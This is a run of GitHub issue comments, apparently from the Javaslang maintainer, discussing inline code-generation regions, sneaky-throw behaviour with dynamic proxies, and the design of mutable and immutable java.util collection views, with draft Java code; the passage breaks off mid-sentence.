We can see the effects by looking at the 'unfolded' code. This makes sense when performing code reviews for PRs. There are no surprises.\nAdditionally we need to ensure that generated code isn't changed directly. We do this by integrating the code-unfolding of our source files into the build process. I.e. manual changes are overwritten. \nRuslan wrote a script that automatically runs on CI build, it checks whether generated code was manually changed. If so, the build breaks.\n\nThere are still details to solve, e.g. declaring java comments within java comments etc. But first I will create a technical spike that solves our problem.. Once I wrote xtext-protected-regionst, a protected region support for Xtext code generators.\nSome of that code can be re-used, e.g. the heuristic to parse protected regions from a source file etc.\n\nI already have more 'features' in mind:\n\nBy default generated code is a block with a start tag GENERATED >>> and an end tag <<< GENERATED (the white-space is optional)\nThe start and end tags are denoted within a java comment:\nsingle line comment //\nmultiline comment /*, */\njavadoc /**, */\n\n\nWe will support code generation within the same line. It is determined by the existence of a newline after the start-tag resp. before the end-tag.\n\n```java\n// ok\npackage test;\nclass Test {\n    /GENERATED>>>s\"Hello ${fqn}!\"/Hello test.Test!/<<<GENERATED/\n}\n// ok!\npackage test;\nclass Test {\n    /GENERATED>>>s\"Hello ${fqn}!\"/\n    Hello test.Test!\n    /<<<GENERATED/\n}\n```\n\nThe start tag GENERATED [unique-id] >>> may contain a unique id that connects this block with a generator function located outside of the file (arguments for that function have to be defined, i.e. file name etc.)\nThe start tag GENERATED >>> scala code may contain the code generator in form of scala code. We may call functions located somewhere outside in a base code generator.\nIt is possible to add comments to GENERATED regions (, e.g. to describe why we generated code). For that reason we put generator code inside a <code> tag. This enables syntax highlighting when viewed in a broweser (e.g. using prismjs).\n\n```java\ninterface Tuple {\n/* GENERATED >>>\ntext text text text text text text text text text text text text text text\ntext text text text text text text text text text text text text text text\ntext text text text text text text text text text text text text text text\n------------------------------------------------<pre><code language=\"scala\">\n    (1 to 3).gen(i => xs\"\"\"\n      static <${gen(\"T\", i)}> Tuple$i<${gen(\"T\", i)}>(${gen(\"T\", i)}) {\n          return new Tuple$i(${gen(\"t\", i)});\n      }\n    \"\"\")(\"\\n\\n\")\n</code></pre>---------------------------------------------------------------\ntext text text text text text text text text text text text text text text\ntext text text text text text text text text text text text text text text\ntext text text text text text text text text text text text text text text\n*/\nstatic <T1> Tuple1<T1> of(T1 t1) {\n    return new Tuple1<>(t1);\n}\n\nstatic <T1, T2> Tuple2<T1, T2> of(T1 t1, T2 t2) {\n    return new Tuple2<>(t1, t2);\n}\n\nstatic <T1, T2, T3> Tuple3<T1, T2, T3> of(T1 t1, T2 t2, T3 t3) {\n    return new Tuple3<>(t1, t2, t3);\n}\n// <<< GENERATED\n\n}\n```\nPlease note that <pre><code> content within a javadoc comment may cause doclint to produce errors/warnings, e.g. when html entities like <, > are used. Therefore we suggest to use singleline und multiline comments.. This might also solve maintenance issues, namely\n1) repeating code that has to be maintained on each collection type separately, for example static methods like narrow(). This could be simplified by having a unique scala generator method that is referenced and parameterized from within the new inline code generator regions:\n```java\ninterface Map {\n// GENERATED >>> genStaticTraversableMethods(\"Map\", isMap = true)\n\n// Empty before first call of generator ;-) This comment will be overwritten!\n\n// <<< GENERATED\n\n}\n```\nAnd the underlying code generator contains the method referenced above:\n```scala\ngenStaticTraversableMethods(name: String, isMap: Boolean = false): String = {\nval type = im.getType(\"javaslang.collection.\" + name)\nval generics = if (isMap) \"<K, V>\" else \"<T>\"\nval widenedGenerics = if (isMap) \"<? extends K, ? extends V>\" else \"<T>\"\n\nxs\"\"\"\n    @SuppressWarnings(\"unchecked\")\n    public static $generics $type$generics($type$widenedGenerics it) {\n        return ($type$generics) it;\n    }\n\"\"\"\n\n}\n```\nNote: In this example only narrow() is generated but the same method may also generate n other methods like flatten(), ...\nThere may be generator methods, depending on where to start within the type hierarchy:\n\ngenSeqMethods\ngenSetMethods\ngenMapMethods\n\nThe generator is able to contain the logic on its own when to generate abstract methods, overridden abstract methods and overridden implementations. This will greatly simplify the maintained code because we pull the logic to a single place!\nUpdate:\nThis will also be the key to solve #1326 (removing abstract types like AbstractMap, AbstractMultimap etc.). The code will simply be generated by shared generator methods instead of using (internal) inheritance.\nMaybe it will also be the key to keep types (like Future/Try and Map/Multimap) in sync? (see #1551, #1532)\n. Out-of-scope. To keep efforts minimal, we will stick with the existing Scala code generator.\nIf we need to check conformity of methods across distinct Types (like Option and Try when removing Value), we could implement unit tests that check method existence using reflection.. Thank you!! :). @mfejzer thanks for changing the name! There's no need to change the name also in the lift() function. There it is a good hint about the characteristics of the function. The signature of the narrow() function parameter already contains the information that the generic is widened.\nMany thanks!! Now we have T-63 issues towards 2.1.0 final.. Thank you, completed exceptionally great ;). Using sneaky throw might lead to and UndeclaredThrowableException when used in conjunction with dynamic proxies.\nExample:\n```java\nimport java.lang.reflect.Proxy;\npublic class Test {\npublic static void main(String[] args) throws Throwable {\n    new Test().run();\n}\n\nvoid run() throws Throwable {\n\n    I obj = (I) Proxy.newProxyInstance(\n            Test.class.getClassLoader(),\n            new Class<?>[] { I.class },\n            (proxy, method, args) -> sneakyThrow(new Exception(\"test\")));\n\n    // This call throws java.lang.reflect.UndeclaredThrowableException.\n    // It could be fixed if I.test() declares 'throws Exception'.\n    // Throwing a RuntimeException does not lead to a UndeclaredThrowableException.\n    obj.test();\n}\n\ninterface I {\n    void test() /* throws Exception */;\n}\n\n@SuppressWarnings(\"unchecked\")\nstatic <T extends Throwable, R> R sneakyThrow(Throwable t) throws T {\n    throw (T) t;\n}\n\n}\n```\nWe should state that in the javadoc when changing Try.get() (which will re-throw the cause in the case of a Failure).. Yes, it introduces new problems, like the UndeclaredThrowableException.... @ravn yes, that seems to be the only solution in order to offer a library with predictable behavior.\nI created a new issue: #2049. Having a Map.values() that returns Seq is a great alternative to having additional interfaces without any value. We keep the things simple.. The current take on having a Map.values() method that returns Seq is sufficient. There is no need for several more interface without any value.. I must repair that CheckStyle.config o_O. @AlparSzabados please wait with this one. This idea came to me while investigating a pattern matching improvement but it might be obsolete.\nAlso we need to concentrate on Milestone 2.1.0 issues. Almost all 3.0.0 issues are not backward compatible. In order to keep the technical release process as simple as possible we first do 2.1.0, after that release we do 3.0.0 changes.. Obsolete. We will keep the concepts of Value and Pattern/unapply() distinct.. Great idea!!. ~~#ThrowAllTheThings\u2122~~\nWe could update the internal delegate reference, i.e. the view will be mutable...\nThen it isn't a View anymore (in the classical sense).\nCould functional Lenses/Prisms help?\n. As always we align to Scala. Scala has JavaConverters. See also this.\n```bash\nscala> import scala.collection.JavaConverters.\nimport scala.collection.JavaConverters.\nscala> Vector(1, 2, 3).asJava\nres0: java.util.List[Int] = [1, 2, 3]\n```\nNaming\nFor Javaslang this means that we have one new method, named asJava.\nType hierarchy\nWe really want to have a Traversable.asJava() that returns java.util.Collection<T>. But this isn't possible in Java. Especially java.util.Map does not extends Collection. Therefore we can't define asJava() at the top level (Traversable). Instead we have these methods:\n```java\ninterface Seq extends Traversable {\n    java.util.List asJava();\n}\ninterface IndexedSeq extends Seq {\n    @Override\n    default java.util.List asJava() {\n        return TODO(\"random access specific view\");\n    }\n}\ninterface LinearSeq extends Seq {\n    @Override\n    default java.util.List asJava() {\n        return TODO(\"linear access specific view\");\n    }\n}\ninterface Set extends Traversable {\n    default java.util.Set asJava() {\n        return TODO(\"set view\");\n    }\n}\ninterface Map extends Traversable> {\n    default java.util.Map asJava() {\n        return TODO(\"map view\");\n    }\n}\ninterface Multimap extends Traversable> {\n    @Override\n    default java.util.Map> asJava() {\n        return TODO(\"map view\");\n    }\n}\n```\nNotes:\n\nFor now we do no conversion for PriorityQueue or Tree. For sure, we could convert to sth. (like java.util.List) just for the sake to convert it to sth. But for now it is not needed.\nIn Javaslang we do not have Iterator.asJava(). Iterator already extends java.util.Iterator. Additionally, as of 3.0.0, Iterator will not extends Iterable any more (see also #1295).\n\nUpdate:\nScala has only converters for mutable collections:\nbash\nscala> Vector(1, 2, 3).asJava\n<console>:14: error: value asJava is not a member of scala.collection.immutable.Vector[Int]\n       Vector(1, 2, 3).asJava\n~~We take another approach. We throw UnsupportedOperationException in the case of mutators like add(), put() and remove().~~\nI provided an update for the above. Sorry for providing you with moving targets. I need to loop while providing impls, read: 1) play around, 2) get an impression, 3) update the constraints, 4) goto 1). This one needs definitely a section in our documentation. I will do that.. @paplorinc Also I would love to see a packag-private javaslang.collection.JavaConverters helper class that contains static helpers that are called from within our collections.\nExample:\n```java\npublic interface IndexedSeq extends Seq {\n    @Override\n    default java.util.List asJava() {\n        return JavaConverters.asJava(this);\n    }\n}\nclass JavaConverters {\n    static  List asJava(IndexedSeq source) {\n        return TODO(\"random access specific view\");\n    }\n}\n```\n(@paplorinc I fixed a typo: toJava -> asJava). @paplorinc my parents in law visit us - will do it this evening.... ## Information on next iteration\n\nThrowing is no good idea, it will lead to endless suffer. We should implement the mutating methods.\nIt is a good practice to define a clear interface (namely the asJava() methods) rather than exposing our internal view implementation types.\nWe need to implement appropriate equals, hashCode and toString methods. The toString should output the same as ArrayList.\nWe should also implement Serializable\nPlease always fully qualify java collection types in our Javaslang codebase, even if there is actually no name clash. (Fully qualifying java.util.functions is not necessary.)\n\n```java\nclass JavaConverters {\nprivate JavaConverters() {\n}\n\nstatic <T> java.util.List<T> asJava(IndexedSeq<T> seq) {\n    return new IndexedSeqAsJavaList<>(seq);\n}\n\nstatic <T> java.util.List<T> asJava(LinearSeq<T> seq) {\n    return new LinearSeqAsJavaList<>(seq);\n}\n\nstatic <T> java.util.Set<T> asJava(Set<T> set) {\n    return new SetAsJavaSet<>(seq);\n}\n\nstatic <K, V> java.util.Map<K, V> asJava(Map<K, V> map) {\n    return new MapAsJavaMap<>(map);\n}\n\nstatic <K, V> java.util.Map<K, Collection<V>> asJava(Multimap<K, V> map) {\n    return new MultimapAsJavaMap<>(map);\n}\n\n// -- private view implementations\n\nprivate static abstract class SeqAsJavaList<T> implements java.util.List<T> {\n\n    protected abstract Seq<Object> delegate();\n\n    // override only methods of List that share the same implementation for IndexedSeq and LinearSeq!\n    @Override\n    public int size() {\n        return delegate().size();\n    }\n\n    @Override\n    public boolean isEmpty() {\n        return delegate().isEmpty();\n    }\n\n    @Override\n    public boolean contains(Object o) {\n        return delegate().contains(o);\n    }\n\n    // et cetera\n\n    @Override\n    public boolean equals(Object o) {\n\n//            if (o == this) {\n//                return true;\n//            } else if (o instanceof java.util.List) {\n//                return Collections.areEqual(delegate(), (java.util.List<?>) o);\n//            } else {\n//                return false;\n//            }\n        // java collections are not equal if references refer to the same memory location\n        return o == this;\n    }\n\n    @Override\n    public int hashCode() {\n        // return delegate().hashCode();\n        return super.hashCode();\n    }\n\n    @Override\n    public String toString() {\n        // not tested, should output the same as java.util.ArrayList\n        return delegate().mkString(\"[\", \",\", \"]\");\n    }\n\n}\n\nprivate static class IndexedSeqAsJavaList<T> extends SeqAsJavaList<T> implements Serializable {\n\n    private static final long serialVersionUID = 1L;\n\n    private IndexedSeq<Object> delegate;\n\n    IndexedSeqAsJavaList(IndexedSeq<T> delegate) {\n        this.delegate = IndexedSeq.narrow(delegate);\n    }\n\n    @Override\n    protected IndexedSeq<Object> delegate() {\n        return delegate;\n    }\n\n    // override the unimplemented methods\n    // ...\n\n    // no need to throw\n    @Override\n    public boolean add(T element) {\n        delegate = delegate.append(element);\n        return true;\n    }\n}\n\n}\n```\n. @seanf\n\nbut there's a reason people use Guava's ImmutableList etc\n\nIn Guava there is no other way around throwing, they just wrap a mutable List. If they would allow to modify it they effectively would have ... a mutable List.\nThe one bad thing with throwing RuntimeException is that it happens at runtime. No one can beware us of ending up with an application with undefined behavior (which is the worst thing that can happen).\nScala did not choose the right path in any case regarding their collection library. That's also a reason for an effort to completely rethink the collection library.\nThese are the pros and cons I see by making the view writable:\nPros:\n\nThe implementation is safe(!)\nNo 'broken' programs in terms of throwing RuntimeException\nNo problems with variance / heap pollution like described in our Cats & Dogs blog post because the underlying delegate is a persistent collection\n\n\nEspecially we can be sure that the original collection (our delegate) is not modified\nWe widen the use cases. If a user needs to use the java collection interfaces he may create a modifiable view in O(1). That's blazing fast!\nIf the user needs unmodifiable versions he may call one of the unmodifiable*() helpers in j.u.Collections. The other way round is not possible: We can't simply make an unmodifiable collection modifiable.\n\nCons:\n\nNot really a con: The application does not throw, if the user calls a mutator method but did not want to call it.\n\nSummed up I see only pros. I think some Java libs did only go the way of creating immutable collection wrappers that throw in order to secure their apps regarding MUTABLE-12. MUTABLE-2 is the only way around this security hole without copying the mutable collection. But our underlying delegate is persistent. This security hole does not exist for us.\nWhich is your biggest fear / what can go wrong? Or is it only \"but the other guys do it the other way\"?. > I'm just pointing to Guava because I see an important use case for immutable java.util.Lists, and so did Google. (Some of their reasoning here: https://github.com/google/guava/wiki/ImmutableCollectionsExplained)\nGuava says: Safe for use by untrusted libraries.\nI think: How can throwing a RuntimeException be safe!?\nGuava says: Thread safe: can be used by many threads with no risk of race conditions.\nI think: Same here\nGuava says: Doesn't need to support mutation, and can make time and space savings with that assumption. All immutable collection implementations are more memory-efficient than their mutable siblings (analysis)\nI think: The memory footprint is equivalent (plus a constant for the wrapper) to that of the persistent collection.\nGuava says: Can be used as a constant, with the expectation that it will remain fixed\nI think: An unsafe constant that throws if it is touched at the wrong place. Not good, I will not build my code on such 'things'.\n\nI guess I also think creating another (much less efficient) form of mutable list is a lot of effort (and perhaps maintenance complexity) for very limited value. I like immutable objects. Being able to say this java.util.List is \"the same\" as that javaslang List is very useful. Once you introduce mutability, that might not be true for long. Just because you can implement the optional mutation methods doesn't mean you must, or should.\n\n\nI see no maintenance hell here: flat hierarchy, few methods, mostly delegating - easy!\n\"much less efficient\" -> tradeoff between fast creation (= view) and most efficient ops (= converted), user can decide\n\n\nI assume javaslang's Iterator.remove() throws UnsupportedOperationException? It's ugly, but sometimes ugly APIs force that on you.\n\n\nI thought about implementing it in a second step, if easily(!) possible (did I mention it?)\n\n\nFor me as a new user, I use javaslang collections for their immutability. (I've been looking for a good, well-documented persistent collection in Maven Central for quite a while.) If I need to view such a javaslang collection as a Java collection, it's for interop, not because I wish I had created a mutable collection.\n\nPersistence is much more than immutability. Writing operations is possible but new versions are created. For me a writeable List presentation is more natural.\nBut yes, indeed, the security hole already mentioned (heap pollution) does also exist for our mutable List view. But that's expected by users because... it is a mutable List!\n\nIf you implement a mutable java.util.List view of a javaslang immutable List, will you also be creating a javaslang.MutableList (view) for completeness? The java.util interfaces have a few warts, and they don't have all the nice javaslang methods.\n\nNo, definitely not. I was asked that several times and I always answered that Java already has mutable collections and the Stream extension for additional operations. I see no use-case for creating more mutable collections. The effort of creation and maintenance will be overkill compared to the gain.\n\nI'm not saying there's no use case for mutable views of immutable collections. In a way, they remind me of Clojure's refs, and seem like a clever idea. But maybe they aren't a core feature for a library which (to me) is about immutable collections, and could instead live outside the javaslang core.\n\n(see above / persistence vs immutability)\n\nYes, Collections.unmodifiable* is an option. I think it would be friendlier if the immutable view were available directly from the javaslang collection methods though. (Especially since I think the immutable collection is the truer representation of the javaslang collection, although I'm apparently alone in that view. The possibility of unwanted exceptions is just an unfortunate consequence of the optional methods in the Java Collections API.)\n\n:+1:\n\nNote that adding an unmodifiable wrapper may make it difficult or impossible to emulate Scala's ability to give you the same Java List every time you convert a Scala/Javaslang list, or to do round-trip conversions. http://docs.scala-lang.org/overviews/collections/conversions-between-java-and-scala-collections.html\n\nNo, we achieve the same. The conversion in both directions will be O(1). (That's the essence they talk about.)\n\nIn any case, if you're willing to break from Scala precedents where it makes sense, I think trying to make a Seq look like a List (despite the big differences in performance guarantees for some operations) is a Scala mistake which should not be emulated.\n\nThere are single linked Lists, lazy linked lists, random access Lists, etc. Java has only random access Lists. Converting IndexedSeq to Java List seems to be more straight-forward... But we will do it also for Seqs because it works out of the box.. @seanf but maybe you are right... let me think a while about it... Javaslang should not be the next Cats & Dogs library.. @seanf @paplorinc I thought about the whole topic.\nMy strategy with Javaslang collections is to provide a safe, more concise and more powerful alternative to the old-school, mutable Java standard collections.\nThe following is considered to be a safe programming style:\njava\nList<T> f(List<U> input) {\n    // 1. we don't modify input\n    // 2. we might use mutable local variables that do not escape to the outside\n    // 3. we return an immutable output\n}\nIn general we follow this programming style as implementor of f. But also we expect this when we are caller of f. It seems to be a good idea to let asJava() return immutable objects. Given that we enforce (by throwing) that no mutator methods are called when passing our objects to other functions.\nBut in the end, the developers are responsible to produce stable code with a defined/reproducable behavior.I see use-cases where it might be of interest to have mutable views:\nReturning a mutable list is ok, when created in a local context:\njava\nList<T> localContext() {\n    Seq<T> seq = ...;\n    ...\n    // users of our API will not mutate the result for security reasons\n    // if a mutable List is needed we might use toList() instead\n    return seq.asList();\n}\nWhen having conversions Seq-List-Seq, a mutable List might come handy:\njava\nSeq<T> localContext(Seq<U> seq) {\n    j.u.List<T> list = seq.asJava(); // produce a List view on seq in O(1)\n    mutateTheSeqBehindTheCurtain(list); // performs operations with a time/mem complexity of seq\n    return Seq.ofAll(list) // recognizes the view and pulls out the current delegate in O(1)\n        .map(...);\n}\nWe might provide a special API that makes the mutable context local:\njava\nSeq<T> localContext(Seq<U> seq) {\n    // conversion back and forth in O(1)\n    return seq.asJava(list -> {\n            mutateTheSeqBehindTheCurtain(list);\n    }).map(...);\n}\nBut how often is this use-case really needed?\nI now aggree to @seanf that returning immutable objects might be the better variant.. @paplorinc Additionally we should provide j.u.SortedMap, j.u.SortedSet conversion.\nAccordingly we need to change method declarations within our type hierarchy:\n```\n// Ok\nSeq: abstract j.u.List asJava()\nIndexedSeq: default j.u.List asJava()\nLinearSeq: default j.u.List asJava()\n// TODO\nSet: default j.u.Set asJava()\nSortedSet: @Override default j.u.SortedSet asJava()\n// TODO\nMap: default j.u.Map asJava()\nMap: @Override default j.u.SortedMap asJava()\n```\ntoString() looks like this:\n```java\n        SortedMap map = new TreeMap<>();\n        map.put(1, \"a\");\n        map.put(2, \"b\");\n        println(map);\n// output:\n{1=a, 2=b}\n    SortedSet<Integer> set = new TreeSet<>();\n    set.add(1);\n    set.add(2);\n    println(set);\n\n// output:\n[1, 2]\n```. @paplorinc In fact we should convert sorted variants to j.u.NavigableSet and j.u.NavigableMap. But for now we can't do that because there is an open issue to add this functionality to Javaslang: #1317 (I'm on it).\nFor now we return SortedSet and SortedMap. I ~~will~~ created another issue (see #1747) for the navigable interfaces that depends on #1317 . @emmanueltouzery Thank you for your feedback. The conversion methods toJava*() will stay with us. What we need to know is if it would help in a real-life application to have a way to additionally create mutable views.\n```java\n// Takes new mem by creating a new ArrayList and copying all elements in O(n).\n// As a result, operations on that List are the same as those of ArrayList.\ntoJavaList()\n// Additional method. creates a List in O(1) by providing a wrapper around a persistent collection.\n// As a result, operations on that List are the same as those of the underlying persistent collection.\nasJava()\n```\nWhat do you think? Would you propagate a mutable view to the outside or copy a collection instead?\n/cc @paplorinc @seanf . I see valid use-cases for all variants. We should\n\nadd asJava() that returns mutable j.u. collections\n~~add asJava(Consumer<List<T>> that allows list mutation in a local scope. The mutated seq is finally returned~~\nadd asJavaImmutable() that returns an immutable view\n\nUpdate: Let's note provide a asJava(Cosumer) for now. It is too much effort to override it on every subtype (which is needed because we need to adjust the return type of the method...).\nDetails (example: IndexedSeq):\n```java\ninterface IndexedSeq extends Seq {\n@Override\ndefault List<T> asJava() {\n    return JavaConverters.asJava(this, false);\n}\n\n@Override\ndefault List<T> asJavaImmutable() {\n    return JavaConverters.asJava(this, true);\n}\n\n}\n```\nThe view impl contains a flag imutable that states, if the collection can me mutated or not:\n```java\nprivate static class SeqAsJavaList implements java.util.List, Serializable {\n    private static final long serialVersionUID = 1L;\n\n    private Seq<T> delegate;\n    private final boolean immutable;\n\n    SeqAsJavaList(Seq<T> delegate, boolean immutable) {\n        this.delegate = delegate;\n        this.immutable = immutable;\n    }\n\n    @Override\n    public boolean add(T element) {\n        ensureMutable();\n        delegate = delegate.append(element);\n        return true;\n    }\n\n    // ...\n\n    private void ensureMutable() {\n        if (immutable) {\n            throw new UnsupportedOperationException();\n        }\n    }\n\n}\n```\nUpdate: Could be also a private static helper:\njava\nfinal class JavaConverters {\n        ...\n        private static void ensureMutable(boolean immutable) {\n            if (immutable) {\n                throw new UnsupportedOperationException();\n            }\n        }\n        ...\n}\n/cc @paplorinc . @paplorinc or you do it more JIT friendly, like in Vector:\njava\n@Override\npublic boolean add(T element) {\n    if (mutable) {\n        delegate = delegate.append(element);\n        return true;\n    } else {\n        throw new UnsupportedOperationException();\n    }\n}\nNote: naming the instance var 'mutable' makes more sense then. Depends on #1800 because ListView.addAll(empty) needs to return false, i.e. not modified.. Note: First I thought it is a good idea to mimic Java's j.u.List behavior. But that applies only to the mutable case. The immutable impls are inconsistent.\nSimple example: set(index, T)  and remove(index) (but there are more...)\n\n. @nfekete Agreed, we shouldn't obfuscate things and raise the possibility of errors by choosing the wrong naming. I liked the short asJava() but I'm totally ok with naming the methods asJavaMutable() and asJavaImmutable().. The Java Collection API docs:\n\nThe \"destructive\" methods contained in this interface, that is, the methods that modify the collection on which they operate, are specified to throw UnsupportedOperationException if this collection does not support the operation. If this is the case, these methods may, but are not required to, throw an UnsupportedOperationException if the invocation would have no effect on the collection. For example, invoking the addAll(Collection) method on an unmodifiable collection may, but is not required to, throw the exception if the collection to be added is empty.\n\nIn order to keep things (and code!) as simple as possible, our immutable views will throw an UnsupportedOperationException before performing non-null and index checks. Half of the standard immutable java.util.List implementations do it this way, the other half performs checks first.. @nfekete\n\nI think Javaslang shouldn't try to guard against every possible misuse of the library, it's enough to aim for a well defined behavior, which IMO is satisfied with the above.\n\nyour views are thoroughly thought through and very helpful - good to have you here!\n(I'm currently finishing the ListView and finally chose the names 'asJava()' and 'asJavaImmutable()'). We layed the grind stone here. Remaining views will be implemented in #1933 . you (I think) :)\nCurrently we use AbstractIterator only in the javaslang.collection package. Iterator itself is used almost everywhere but it is instantiated by using the factory methods. I think it could be made package private. Let users write Iterators how they are used to write them!. @ruslansennov \n\n. Thank you!. Thank you!. Great, thank you!. Thank you, I already looked into it but need until tomorrow to give feedback.. @paplorinc @ruslansennov @seanf please find my suggestions here: https://github.com/javaslang/javaslang/issues/1728#issuecomment-264705324. Hi Lorinc, thank you for your changes, please go on based on this:\n```java\n/     / _  _    _   __  / \\   _\n *    /  /    \\/ \\  / \\/    \\ /  /_\\/  //    \\/  \\  //  /_\\   J\u039bV\u039bSL\u039bNG\n *  /  /  /\\  \\  \\/  /  /\\  \\\\  \\  //  /\\  \\ /\\/ \\ /\\ \\   Copyright 2014-2016 Javaslang, http://javaslang.io\n * //_/  _/_/_/  _/_\\/__/__/  _//  __/_____/   Licensed under the Apache License, Version 2.0\n /\npackage javaslang.collection;\nimport java.io.Serializable;\nimport java.util.*;\nimport java.util.Iterator;\nimport java.util.List;\nimport static javaslang.API.TODO;\n/\n * THIS CLASS IS INTENDED TO BE USED INTERNALLY ONLY!\n * \n * This helper class is similar to scala.collection.JavaConverters.\n * It provides methods that return views on Java collections.\n * \n * These views are tightly coupled to collections of same characteristics, e.g.\n \n * \n * javaslang.collection.Seq has a java.util.List view\n * javaslang.collection.Set has a java.util.Set view\n * javaslang.collection.Map has a java.util.Map view\n * javaslang.collection.Multimap has a java.util.Map view\n * \n\n * Subtypes of the Javaslang types mentioned above can have special views that make use of optimized implementations.\n \n * @author Pap L\u0151rinc, Daniel Dietrich\n * @since 2.1.0\n /\nclass JavaConverters {\nprivate JavaConverters() {\n}\n\nstatic <T> java.util.List<T> asJava(IndexedSeq<T> seq) {\n    return new SeqAsJavaList<>(seq);\n}\n\nstatic <T> java.util.List<T> asJava(LinearSeq<T> seq) {\n    return new SeqAsJavaList<>(seq);\n}\n\n// TODO\n//    static  java.util.List asJava(Set set) {\n//        return new SetAsJavaSet<>(set);\n//    }\n//\n//    static  java.util.Map asJava(Map map) {\n//        return new MapAsJavaMap<>(map);\n//    }\n//\n//    static  java.util.Map> asJava(Multimap map) {\n//        return new MultimapAsJavaMap<>(map);\n//    }\n// -- private view implementations\n\nprivate static class SeqAsJavaList<T> implements java.util.List<T>, Serializable {\n\n    private static final long serialVersionUID = 1L;\n\n    private Seq<T> delegate;\n\n    SeqAsJavaList(Seq<T> delegate) {\n        this.delegate = delegate;\n    }\n\n    @Override\n    public boolean add(T element) {\n        delegate = delegate.append(element);\n        return true;\n    }\n\n    @Override\n    public void add(int index, T element) {\n        // may throw an IndexOutOfBoundsException accordingly to the j.u.List.add(int, T)\n        delegate = delegate.insert(index, element);\n    }\n\n    @Override\n    public boolean addAll(Collection<? extends T> collection) {\n        delegate = delegate.appendAll(collection);\n        return true;\n    }\n\n    @Override\n    public boolean addAll(int index, Collection<? extends T> collection) {\n        // may throw an IndexOutOfBoundsException accordingly to the j.u.List.addAll(int, Collection)\n        delegate = delegate.insertAll(index, collection);\n        return true;\n    }\n\n    @Override\n    public void clear() {\n        delegate = delegate.take(0);\n    }\n\n    @Override\n    public boolean contains(Object obj) {\n        // may throw a ClassCastException accordingly to the j.u.List.contains(Object)\n        @SuppressWarnings(\"unchecked\") final T that = (T) obj;\n        return delegate.contains(that);\n    }\n\n    @Override\n    public boolean containsAll(Collection<?> collection) {\n        // may throw a ClassCastException accordingly to the j.u.List.containsAll(Collection)\n        @SuppressWarnings(\"unchecked\") final Collection<T> that = (Collection<T>) collection;\n        return delegate.containsAll(that);\n    }\n\n    @Override\n    public T get(int index) {\n        // may throw an IndexOutOfBoundsException accordingly to the j.u.List.get(int)\n        return delegate.get(index);\n    }\n\n    @Override\n    public int indexOf(Object obj) {\n        // may throw a ClassCastException accordingly to the j.u.List.indexOf(Object)\n        @SuppressWarnings(\"unchecked\") final T that = (T) obj;\n        return delegate.indexOf(that);\n    }\n\n    @Override\n    public boolean isEmpty() {\n        return delegate.isEmpty();\n    }\n\n    @Override\n    public Iterator<T> iterator() {\n        return delegate.iterator();\n    }\n\n    @Override\n    public int lastIndexOf(Object obj) {\n        // may throw a ClassCastException accordingly to the j.u.List.lastIndexOf(Object)\n        @SuppressWarnings(\"unchecked\") final T that = (T) obj;\n        return delegate.lastIndexOf(that);\n    }\n\n    @Override\n    public ListIterator<T> listIterator() {\n        // TODO\n        return TODO(\"listIterator()\");\n    }\n\n    @Override\n    public ListIterator<T> listIterator(int index) {\n        // TODO\n        return TODO(\"listIterator(int)\");\n    }\n\n    @Override\n    public T remove(int index) {\n        // may throw an IndexOutOfBoundsException accordingly to the j.u.List.remove(int)\n        return setDelegateAndGetPreviousElement(index, delegate.removeAt(index));\n    }\n\n    @Override\n    public boolean remove(Object o) {\n        // may throw a ClassCastException accordingly to the j.u.List.remove(Object)\n        @SuppressWarnings(\"unchecked\") final T that = (T) o;\n        return setDelegateAndCheckChanged(delegate.remove(that));\n    }\n\n    @Override\n    public boolean removeAll(Collection<?> c) {\n        // may throw a ClassCastException accordingly to the j.u.List.removeAll(Collection)\n        @SuppressWarnings(\"unchecked\") final Collection<T> that = (Collection<T>) c;\n        return setDelegateAndCheckChanged(delegate.removeAll(that));\n    }\n\n    @Override\n    public boolean retainAll(Collection<?> c) {\n        // may throw a ClassCastException accordingly to j.u.List.retainAll(Collection)\n        @SuppressWarnings(\"unchecked\") final Collection<T> that = (Collection<T>) c;\n        return setDelegateAndCheckChanged(delegate.retainAll(that));\n    }\n\n    @Override\n    public T set(int index, T element) {\n        // may throw an IndexOutOfBoundsException accordingly to the j.u.List.set(int, T)\n        return setDelegateAndGetPreviousElement(index, delegate.update(index, element));\n    }\n\n    @Override\n    public int size() {\n        return delegate.size();\n    }\n\n    @Override\n    public List<T> subList(int fromIndex, int toIndex) {\n        // may throw IndexOutOfBoundsException accordingly to j.u.List.subList(int, int)\n        return new SeqAsJavaList<T>(delegate.subSequence(fromIndex, toIndex));\n    }\n\n    @Override\n    public Object[] toArray() {\n        return delegate.toJavaArray();\n    }\n\n    @Override\n    public <U> U[] toArray(U[] array) {\n        return delegate.toJavaList().toArray(array);\n    }\n\n    // -- Object.*\n\n    @Override\n    public boolean equals(Object o) {\n        if (o == this) {\n            return true;\n        } else if (o instanceof java.util.List) {\n            return Collections.areEqual(delegate, (java.util.List<?>) o);\n        } else {\n            return false;\n        }\n    }\n\n    @Override\n    public int hashCode() {\n        return delegate.hashCode();\n    }\n\n    @Override\n    public String toString() {\n        return delegate.mkString(\"[\", \", \", \"]\");\n    }\n\n    // -- private helpers\n\n    private T setDelegateAndGetPreviousElement(int index, Seq<T> newDelegate) {\n        final T previousElement = delegate.get(index);\n        delegate = newDelegate;\n        return previousElement;\n    }\n\n    private boolean setDelegateAndCheckChanged(Seq<T> newDelegate) {\n        final boolean changed = delegate.size() != newDelegate.size();\n        delegate = newDelegate;\n        return changed;\n    }\n}\n\nprivate static abstract class SetAsJavaSet<T> implements java.util.List<T>, Serializable {\n\n    private static final long serialVersionUID = 1L;\n\n    private Set<T> delegate;\n\n    SetAsJavaSet(Set<T> delegate) {\n        this.delegate = delegate;\n    }\n\n    // TODO\n}\n\nprivate static abstract class MapAsJavaMap<K, V> implements java.util.Map<K, V>, Serializable {\n\n    private static final long serialVersionUID = 1L;\n\n    private Map<K, V> delegate;\n\n    MapAsJavaMap(Map<K, V> delegate) {\n        this.delegate = delegate;\n    }\n\n    // TODO\n}\n\nprivate static abstract class MultimapAsJavaMap<K, V> implements java.util.Map<K, java.util.Collection<V>>, Serializable {\n\n    private static final long serialVersionUID = 1L;\n\n    private Multimap<K, V> delegate;\n\n    MultimapAsJavaMap(Multimap<K, V> delegate) {\n        this.delegate = delegate;\n    }\n\n    // TODO\n}\n\n}\n```\nThere are still TODOs. I would stay with one SeqAsJavaList impl. The listIterator() methods could check via instanceof if the delegate is an IndexedSeq and provide an optimized ListIterator impl. Haven't looked into it yet - need to sleep.\nNext step could also be to implement a ListIterator that supports remove operations similar to those I did for the Seq view...\n\n~~This change turns out to be really cool (in some way) because we are implementing persistent java.util Collections!!! The only caveat is that we do 